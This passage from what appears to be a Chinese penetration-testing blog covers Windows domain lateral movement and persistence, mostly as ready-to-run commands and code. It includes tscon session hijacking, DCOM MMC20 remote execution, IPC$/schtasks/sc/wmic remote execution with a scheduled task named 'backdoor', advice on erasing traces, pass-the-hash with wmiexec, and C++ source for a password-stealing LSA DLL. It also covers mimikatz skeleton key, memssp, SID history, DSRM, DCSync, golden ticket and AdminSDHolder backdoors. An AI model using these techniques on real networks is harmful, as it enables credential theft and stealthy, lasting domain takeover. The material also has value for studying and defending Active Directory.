开启客户端，这里的target随便填</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143306.png" alt="QQ截图20210217143306"></p><p>那么再回到需要两个机器，一个当服务端一个当客户端的情况吧。</p><p>服务端建立: tsssp::server 需要SYSTEM权限</p><p>客户端链接: tsssp::client /target:服务端的SPN（一般采用TERMSRV服务） /pipe: \服务端域名\pipe\kekeo_tsssp_endpoint 普通用户权限即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143322.png" alt="QQ截图20210217143322"></p><h2 id="tscon横向"><a href="#tscon横向" class="headerlink" title="tscon横向"></a>tscon横向</h2><p>若一个机器上有多个用户登录，则在任务管理器可以看见如下场面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143439.png" alt="QQ截图20210217143439"></p><p>其中，我们可以右键其他用户选择链接，输入其密码后就能进入其桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143500.png" alt="QQ截图20210217143500"></p><p>但是对于system用户来说，要链接到其他用户是不需要输入密码的，可以直接连接。所以我们可以通过system权限获取登录在当前机器上的域用户权限。<br>比如上图中的administrator是域管，我有当前机器的system权限，那么我可以直接用以下命令完成用户权限获得。</p><p>query user 获得administrator用户的id</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143547.png" alt="QQ截图20210217143547"></p><p>可以发现admin的id是2，那么我们就可以用tscon这个windows自带的命令行工具完成权限获得。</p><p>cmd /k tscon 2 /dest:console</p><p>执行以上命令，我们跳转到了admin的桌面</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217143616.png" alt="QQ截图20210217143616"></p><h2 id="利用COM-DCOM对象"><a href="#利用COM-DCOM对象" class="headerlink" title="利用COM/DCOM对象"></a>利用COM/DCOM对象</h2><p>参考:<a href="https://www.freebuf.com/articles/network/256372.html">https://www.freebuf.com/articles/network/256372.html</a> </p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>DCOM是COM的扩展，允许应用程序实例化和访问远程计算机上的COM对象。<br>这里简要说一下几个有关COM的概念</p><p>CLSID：又叫CLASSID 一个COM类的唯一标识符，每一个Windows注册类与一个CLSID相关联。长得像这样 {20D04FE0-3AEA-1069-A2D8-08002B30309D}</p><p>ProgID：其可被用作对用户更友好的替代的一个CLSID，比如MMC20.APPLICATION.1就是一个ProgID。ProgID不能保证是唯一的，并非每个类都与ProgID相关联</p><p>Appid: 为了保证COM对象能被顺利的远程调用（即为了使DCOM可访问COM对象），需要把APPID与该类的CLSID相关联，且AppID需设置权限来规划哪些客户端能够访问</p><p>我们可以通过powershell执行get-CimInstance 来列出本地COM程序列表</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223152713449.png" alt="image-20210223152713449"></p><p>远程DCOM对象实例化的流程:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">客户端从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID则先将其本地解析为CLSID。</span><br><span class="line">远程计算机检查是否存在由该CLSID所关联的AppID，并验证客户端的权限。</span><br><span class="line">DCOMLaunch服务将创建所请求的类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。</span><br><span class="line">客户端应用程序和服务器进程间建立通信，客户端便可以访问新创建的对象。</span><br></pre></td></tr></table></figure><h3 id="MMC20-APPLICATION-1"><a href="#MMC20-APPLICATION-1" class="headerlink" title="MMC20.APPLICATION.1"></a>MMC20.APPLICATION.1</h3><p>中文名为： Microsoft管理控制台（MMC）2.0包括脚本对象模型。 我们一步步抽丝剥茧跟踪一下这个对象的利用点，需要注意的一点是调用该对象必须要有管理员权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161553486.png" alt="image-20210223161553486"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223160909543.png" alt="image-20210223160909543"></p><p>如上图，我们先列出在MMC20.APPLICATION中的模块，然后继续列出其中Document中的属性，再继续列出Document.ActiveView中的属性。可以发现一个名为ExecuteShellCommand的方法，光是听名字就知道是可以执行shell命令的方法了。到微软文档查一查这个方法，获得了以下信息。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExecuteShellCommand（[命令][目录][叁数][窗口状态]）</span><br><span class="line">命令</span><br><span class="line">一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。</span><br><span class="line"></span><br><span class="line">目录</span><br><span class="line">一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。</span><br><span class="line"></span><br><span class="line">窗口状态</span><br><span class="line">一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。</span><br><span class="line"></span><br><span class="line">“Maximized”</span><br><span class="line">该命令在最大化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Minimized”</span><br><span class="line">该命令在最小化的窗口中执行。</span><br><span class="line"></span><br><span class="line">“Restored”</span><br><span class="line">该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">此方法不返回值。</span><br></pre></td></tr></table></figure><p>于是乎，我们就能理所应当的想到这个东西可以被用于本地任意命令执行，就像这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot;)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;) </span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210223161252812.png" alt="image-20210223161252812"></p><p>我们进一步发掘其横向移动的能力</p><p>我们知道DCOM具有通过网络与对象进行交互的能力，在我们是管理员的前提下我们可以使用GetTypeFromProgID()与powershell进行DCOM远程交互。<br>GetTypeFromProgID(“COM”,”远程ip”) 即可指定与哪一个远程IP进行交互。所以我们可以把payload改造成这样，进而可以在其他机器上进行任意命令执行，从而达到横向移动的目的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.application&quot; ，“远程ip”)).Document.ActiveView.Executeshellcommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Restored&quot;)</span><br></pre></td></tr></table></figure><h2 id="ipc"><a href="#ipc" class="headerlink" title="ipc"></a>ipc</h2><h3 id="ipc简介"><a href="#ipc简介" class="headerlink" title="ipc简介"></a>ipc简介</h3><p>IPC$是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，即能建立链接，达到访问远程计算机的目的。利用这个链接不仅可以访问目标机器中的文件，进行上传下载等操作，还能在目标机器上执行部分命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure><p>如果账户和口令正确，就建立好了链接。</p><p>建立好链接后就能执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\192.168.183.130\c$ 列出C盘</span><br><span class="line">copy C:\Users\douser\Desktop\whoami.txt \\192.168.183.130\c$ 上传文件</span><br><span class="line">tasklist &#x2F;S 192.168.183.130 &#x2F;U administrator &#x2F;P liu78963 列出某IP上的进程信息，&#x2F;U指定哪个用户执行该命令，&#x2F;p指定该用户密码</span><br><span class="line">net use \\IP &#x2F;del &#x2F;y 删除链接</span><br><span class="line">net use 查看已建立的ipc链接</span><br></pre></td></tr></table></figure><h3 id="利用ipc横向移动"><a href="#利用ipc横向移动" class="headerlink" title="利用ipc横向移动"></a>利用ipc横向移动</h3><h4 id="at"><a href="#at" class="headerlink" title="at"></a>at</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 17:05:00 cmd.exe &#x2F;c &quot;&lt;命令&gt;&quot;</span><br><span class="line">at \\192.168.183.130 17:05:00 powershell.exe -c &quot;&lt;命令&gt;&quot;</span><br></pre></td></tr></table></figure><p>关于时间的获得，可以使用 net time \\IP 获得。</p><p>计划任务执行后需要删除，不留痕迹</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">at \\192.168.183.130 1 &#x2F;delete  &#x2F;&#x2F;1为任务的ID</span><br></pre></td></tr></table></figure><p>关于此方法我们可以先通过copy上传恶意文件然后通过at来执行它，或者直接通过powershell远程加载上线等</p><h4 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a><strong>schtasks</strong></h4><p>at命令已经被Windows Vista、Windows Server 2008及之后版本的操作系统废弃了，取而代之的是schtasks命令。</p><p>横向移动的大致思路与at差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在目标主机上创建一个名称为“backdoor”的计划任务。该计划任务每分钟启动一次，启动程序为我们之前到C盘下的shell.exe，启动权限为system。</span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1  &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f </span><br><span class="line"></span><br><span class="line">但也有些时候，由于当前权限或组策略设置等原因，该schtasks方法远程创建计划任务可能会报错拒绝访问,遇到这种情况，我们可以加上&#x2F;u和&#x2F;p参数分别设置高权限用户名和密码 </span><br><span class="line">schtasks &#x2F;create &#x2F;s 192.168.183.130 &#x2F;u username &#x2F;p password &#x2F;tn backdoor &#x2F;sc minute &#x2F;mo 1 &#x2F;tr c:\shell.exe &#x2F;ru system &#x2F;f</span><br><span class="line"></span><br><span class="line">另外，在我们创建好计划任务后，可以通过下列指令立即让计划任务执行（如果拒绝访问的话就加上&#x2F;u &#x2F;p参数）</span><br><span class="line">schtasks &#x2F;run &#x2F;s 192.168.183.130 &#x2F;i &#x2F;tn backdoor  &#x2F;&#x2F; i：忽略任何限制立即运行任务</span><br><span class="line"></span><br><span class="line">计划任务执行后需要清理痕迹</span><br><span class="line">schtasks &#x2F;delete &#x2F;s 192.168.183.130 &#x2F;tn &quot;backdoor&quot; &#x2F;f</span><br></pre></td></tr></table></figure><h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><p>这个命令可以操控服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc \\[主机名&#x2F;IP] create [servicename] binpath&#x3D; &quot;[path]&quot;   #创建服务，其中binpath可以是某个exe文件的路径，也可以是一段指令。当为路径时，服务启动时会自动执行该exe文件，当为指令时，服务启动时会自动执行该指令</span><br><span class="line">sc \\[host] start [servicename] 启动某个服务</span><br><span class="line">sc \\[host] delete [servicename]   #删除服务</span><br></pre></td></tr></table></figure><h2 id="wmi"><a href="#wmi" class="headerlink" title="wmi"></a>wmi</h2><p>从Windows 98开始，Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以通过/node选项使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，它允许系统管理员远程执行自动化管理任务，例如远程启动服务或执行命令。并且wimc执行命令时不会留下日志信息。</p><p>通过wmic在远程主机上开启进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmic &#x2F;node:192.168.183.130 &#x2F;user:administrator &#x2F;password:Liu78963 process call create &quot;command&quot;</span><br></pre></td></tr></table></figure><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>通过wmic创建远程进程时，不会有回显，需要通过ipc$链接type，重定向等手段才能看到回显结果，就很不方便，wmicexec的出现就很好的解决了这一痛点。</p><p>wmiexec普遍来说有三种版本.py，exe，.vbs。可以走socks5协议代入内网，杜绝了bypassav的麻烦。<br>(exe版本网上似乎很不好找) 这里用python版本，下载链接<a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22%EF%BC%8C">https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_22，</a> impacket按照网上安装来弄就行了<br>1.环境linux，我们配置好proxychanis代入内网（略<br>2.proxychains wmiexec.py 域名/用户名:密码@ip  获得shell<br>3.也可以进行hash传递 python wmiexec.py -hashes LM Hash:NT Hash 域名/用户名@目标IP </p><p>效果图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210226204713405.png" alt="image-20210226204713405"></p><h1 id="域管权限维持"><a href="#域管权限维持" class="headerlink" title="域管权限维持"></a>域管权限维持</h1><h2 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h2><p>原理：当用户修改密码时会输入明文密码，LSA会调用PasswordChangeNotify 在系统中同步密码。我们HOOK这个函数，改变其行为，就能达到获取用户修改后的密码的明文.</p><p>Tool: Powersploit下的Invoke-ReflectivePEInjection.ps1 （用于注入）<br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a><br>以及 <a href="https://github.com/clymb3r/Misc-Windows-Hacking">https://github.com/clymb3r/Misc-Windows-Hacking</a> 的HookPasswordChange.dll(需自行编译)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-ReflectivePEInjection.ps1</span><br><span class="line">Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass</span><br></pre></td></tr></table></figure><p>执行如上命令，只要修改了用户的密码，修改后的明文密码就会记录在 C:\Windows\Temp\passwords.txt 文件中。</p><p>下面我们分析一下原理</p><p>当密码改变请求发生时，LSA会调用Password Filters。每一个password filter会先验证新密码的合法性和复杂度，然后LSA会发出请求已更改的信号。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133057.png" alt="QQ截图20210217133057"></p><p>该过程由 password notification DLL 完成。所以我们只需要劫持这个DLL，把它换成我们自定义的DLL即可达到目的。<br>这种方式一般在Server服务器上利用率较高<br>通常来说，这个dll文件的在注册表中的路径是 hklm\system\currentcontrolset\control\lsa的 notification packages表项。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133116.png" alt="QQ截图20210217133116"></p><p>我们要利用该方法，首先要确保密码策略已启用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133138.png" alt="QQ截图20210217133138"></p><p>至于命令行怎么修改。可以这样</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secedit &#x2F;export &#x2F;cfg gp.inf &#x2F;quiet   将组策略导出为文件</span><br><span class="line">在该文件里将PasswordComplexity项值修改为1</span><br><span class="line">然后用secedit &#x2F;configure &#x2F;db gp.sdb &#x2F;cfg gp.inf &#x2F;quiet 将其导入数据库</span><br><span class="line">刷新组策略： gpupdate&#x2F;force</span><br><span class="line">重启后生效</span><br></pre></td></tr></table></figure><p>下面我们构造dll文件去覆盖它。</p><p>首先我们的dll文件内容如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;NTSecAPI.h&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall InitializeChangeNotify() &#123;</span><br><span class="line">OutputDebugString(L&quot;InitializeChangeNotify&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordFilter(</span><br><span class="line">PUNICODE_STRING AccountName,</span><br><span class="line">PUNICODE_STRING FullName,</span><br><span class="line">PUNICODE_STRING Password,</span><br><span class="line">BOOLEAN SetOperation)</span><br><span class="line">&#123;</span><br><span class="line">OutputDebugString(L&quot;PasswordFilter&quot;);</span><br><span class="line">return TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">extern &quot;C&quot; __declspec(dllexport) BOOLEAN __stdcall PasswordChangeNotify(</span><br><span class="line">PUNICODE_STRING UserName,</span><br><span class="line">ULONG RelativeId,</span><br><span class="line">PUNICODE_STRING NewPassword)</span><br><span class="line">&#123;</span><br><span class="line">FILE *pFile;</span><br><span class="line">fopen_s(&amp;pFile, &quot;C:\\logFile.txt&quot;, &quot;a+&quot;);</span><br><span class="line">fprintf(pFile, &quot;%ws:%ws&quot;, UserName-&gt;Buffer, NewPassword-&gt;Buffer);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后把这个dll文件放入system32文件，然后修改注册表，使 hklm\system\currentcontrolset\control\lsa的 notification packages表项包括我们的恶意dll文件，具体命令行操作如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKLMSYSTEMCurrentControlSetControlLsa&quot; &#x2F;v &quot;Notification Packages&quot; &#x2F;t REG_MULTI_SZ &#x2F;d &quot;evildll&quot; &#x2F;f</span><br></pre></td></tr></table></figure><p>重启后生效。无奈的是我把dll文件写出来了且确保是正确的，在win7和win2012上复现均失败，网上成功的例子是win2008server，可惜我并没有这个版本的虚拟机不过原理倒是懂了</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>运用mimkatz可以在域控机上对所有用户添加一个统一密码用来登录.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimikatz# misc::skeleton</span><br></pre></td></tr></table></figure><p>然后所有用户都能用密码 mimiaktz登陆了</p><h2 id="SSP注入"><a href="#SSP注入" class="headerlink" title="SSP注入"></a>SSP注入</h2><p>ssp:一个DLL文件，用来实现Windows身份验证功能，比如kerberos，ntlm。系统启动时SSP会被自动加载入lsass.exe<br>sspi:SSP的API接口</p><p>如果我们自定义个恶意dll文件让他在系统启动时自动加载到lsass.exe,就能得到进程中的明文密码</p><p>临时性注入(重启便失效)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz# privilege::debug</span><br><span class="line">mimiaktz# misc::memssp</span><br></pre></td></tr></table></figure><p>执行如上命令, 然后只要目标机器不重启，在目标机器上登录的用户名和密码将会被记录在 C:\Windows\System32\mimilsa.log 文件中。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png" alt="QQ截图20210217133322"></p><p>长期性注入（重启不失效）</p><p>把 mimikatz中的mimilib.dll放到系统的C:\Windows\System32\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。</p><p>修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的DLL文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png" alt="QQ截图20210217133335"></p><p>用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log</p><h2 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h2><p>sid history:当我们把域A的用户x迁移到域B时，B域中x的sid会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history诞生了， 系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。</p><p>在域控上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add &#x2F;sam:const27 &#x2F;new:administrator 将administrator的SID添加到const27的sid history属性</span><br></pre></td></tr></table></figure><p>然后可以在域控上验证其sid history是否更改成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser const27 -Properties sidhistory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png" alt="QQ截图20210217133438"></p><p>可以发现现在是有SIDHistory属性了。而且末尾的500预示着ADMIN权限</p><h2 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h2><p>DSRM账号:每个域控上都有一个本地管理员账户也就是DSRM账户，用于在域环境出现故障时本地登录进行修复.可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。 ）</p><p>我们先设置DSRM密码<br>域控上输入ntdsutil<br>然后输入reset password on server null<br>然后键入密码，最后按q退出即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png" alt="QQ截图20210217133606"></p><p>在mimikatz中dump本地hash可以看到多出来个Administrator</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png" alt="QQ截图20210217133631"></p><p>然后设置DSRM登陆方式<br>DSRM登陆方式有三种分别对应123.</p><ul><li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li><li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li><li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li></ul><p>我们需要将他改成2才行。powershell执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure><p>即可.然后直接psexec登录(这里用的是cs)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png" alt="QQ截图20210217133652"></p><p>注意填Realm时要填上面dump出sam时的域名（这里是DC）</p><h2 id="委派后门"><a href="#委派后门" class="headerlink" title="委派后门"></a>委派后门</h2><p>这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的ST2保存起来，或者非约束性委派得到的TGT，要用的时候加载进内存就行了</p><h2 id="DCSYNC"><a href="#DCSYNC" class="headerlink" title="DCSYNC"></a>DCSYNC</h2><p>这个东西 可以实现不登录到域控而获取域控上的数据<br>获得以下权限就可以使用了</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>然后在mimikatz里<br>privilege::debug<br>lsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png" alt="QQ截图20210217133813"></p><p>然后我们就可以通过krbtgt hash制作黄金票据登录administrator。<br>如果还想隐蔽一点，可以给普通用户添加如下ACE,使其获得dcsync权限</p><ul><li></li><li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li></ul><p>可以以管理员权限运行powerview.ps1完成以上操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#给域用户hack添加以上三条ACE</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#给域用户hack删除以上三条ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>然后普通用户也可以用mimikatz调用dcsync导出hash了</p><h3 id="配合EXCHANGE用户达到域提权目的"><a href="#配合EXCHANGE用户达到域提权目的" class="headerlink" title="配合EXCHANGE用户达到域提权目的"></a>配合EXCHANGE用户达到域提权目的</h3><p>前提:一个exchange高权限组的用户控制权，一个机器账户</p><p>exchange安装后会在AD上生成两个容器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png" alt="QQ截图20210217141602"></p><p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。<br>其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png" alt="QQ截图20210217141614"></p><p>假设我们已经拿到了exchange trusted subsystem中一个用户的控制权。<br>那么就可用dysync进行权限维持了</p><h2 id="黄金票据生成"><a href="#黄金票据生成" class="headerlink" title="黄金票据生成"></a>黄金票据生成</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#提权</span><br><span class="line">privilege::debug</span><br><span class="line"> </span><br><span class="line">#生成黄金票据并导入</span><br><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:当前用户sid去掉最后一个数据 &#x2F;krbtgt:krbtgt的hash &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h2><p>AdminSDHolder是一个特殊容器，用作受保护用户或组的ACM模板。AD定期把 AdminSDHolder对象的ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法 。</p><p>如何寻找受保护用户或组：</p><p>受保护用户或组的 <strong>AdminCount属性为1</strong> 。 但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组 。</p><p>使用powerview.ps1<code>Get-NetUser -AdminCount</code>即可获得受保护用户<br><code>Get-NetGroup -AdminCount</code>即可获得受保护组</p><p>如何修改ADMINSDHOLDER的ACL</p><p>域管执行以下命令(powerview.ps1)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL</span><br><span class="line">给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png" alt="QQ截图20210217133841"></p><p>然后默认等60分钟，待ADMINSDHOLDER生效后，xx就获得所有受保护对象的完全控制权了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png" alt="QQ截图20210217133909"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;横向移动&quot;&gt;&lt;a href=&quot;#横向移动&quot; class=&quot;headerlink&quot; title=&quot;横向移动&quot;&gt;&lt;/a&gt;横向移动&lt;/h1&gt;&lt;h2 id=&quot;PTH&quot;&gt;&lt;a href=&quot;#PTH&quot; class=&quot;headerlink&quot; title=&quot;PTH&quot;&gt;&lt;/a&gt;PT</summary>
      
    
    
    
    
    <category term="内网渗透" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
